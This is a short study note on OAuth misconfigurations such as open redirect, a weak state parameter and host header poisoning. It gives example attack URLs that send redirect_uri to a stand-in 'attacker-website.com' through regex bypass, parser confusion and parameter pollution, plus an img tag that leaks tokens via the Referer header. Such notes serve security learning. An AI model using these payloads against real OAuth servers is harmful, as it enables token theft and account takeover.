Daily Notes : Day 29 
Oauth misconfiguration 🔒
1: Open Redirect 
2: Improper handling of state parameter (state parameter is a value that is missing or a static value that never changes ) 
3: Improper implementation of the Implicit Grant
4: Disclosure of secrets
5: The authorization server can allow to use accounts with unconfirmed email for granting access to protected resources
6: Host header poisoning

https://t.co/TpfLWKj0QZ

There are several weak configurations, depending on the logic handled by the server:
Open redirect:
https://auth-server.com/auth?redirect_uri=https://attacker-website.com

Path traversal or stealing tokens via a proxy page:
“redirect_url=https://<app-auth-url>/callback/../some/path” 

Weak regex:
/auth?redirect_url=https://application-website.com.attacker-website.com

Discrepancies between the parsing of the URI by the different components:
/auth?redirect_url=https://application-website.com%20%26@foo.attacker-website.com#@bar.attacker-website.com

HTTP parameter pollution:
“/auth?redirect_uri=https://<app-auth-url>/callback&redirect_uri=https://attacker-website.com”

Accidentally permitted any redirect URI  beginning with localhost in a production environment:
/auth?redirect_uri=https://localhost.attacker-website.com

HTML Injection and stealing tokens via Referer header:
<img src="http://attacker-website.com">
Dangerous javascript that handles query parameters and URL fragments.
